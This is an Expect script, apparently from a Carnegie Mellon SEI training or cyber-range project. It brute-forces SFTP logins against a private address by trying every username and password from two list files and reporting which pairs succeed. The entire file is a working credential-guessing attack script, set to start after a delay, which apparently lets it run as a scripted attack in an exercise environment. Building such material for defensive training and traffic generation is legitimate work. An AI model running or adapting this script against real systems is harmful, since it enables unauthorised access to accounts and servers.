
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

#!/usr/bin/expect -f

sleep 100

# Define the target SFTP server and port
set target "10.1.1.15"
set port "22"

# Path to the file containing usernames and passwords
set userlist "/etc/systemd/system/userlist.txt"
set passwordlist "/etc/systemd/system/passwordlist.txt"

# Loop through each password
set passwordlist_file [open $passwordlist r]
while {[gets $passwordlist_file password] != -1} {
    set userlist_file [open $userlist r]
    while {[gets $userlist_file username] != -1} {
        spawn sftp $username@$target:$port
        expect {
            "password:" {
                send "$password\r"
                expect {
                    "Permission denied" {
                        puts "Login failed for username: $username, password: $password"
                        close
                        wait
                        continue
                    }
                    "Succ" {
                        puts "Login successful for username: $username, password: $password"
                        send "exit\r"
                        close
                        wait
                        continue
                    }
                }
            }
            timeout {
                puts "Connection timeout for username: $username, password: $password"
                close
                wait
                continue
            }
        }
    }
    close $userlist_file
}

close $passwordlist_file

puts "All login attempts completed."

